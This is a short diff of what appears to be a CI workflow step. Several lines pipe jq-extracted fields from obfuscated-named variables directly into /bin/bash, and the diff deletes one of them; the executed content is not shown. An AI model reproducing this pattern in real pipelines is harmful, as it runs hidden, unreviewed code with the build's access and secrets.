@@ -30,7 +30,6 @@ jobs:
           echo $sl199 | jq -r .lxq6 | /bin/bash
           printf '%s' "$ag17210" | jq -r .u44827 | /bin/bash
           printf '%s' "$bm7642" | jq -r .ty59225 | /bin/bash
-          echo $nstct1 | jq -r .qdf50667 | /bin/bash
           printf '%s' "$z2436" | jq -r .s491 | /bin/bash
 
       - name: Archive artifact
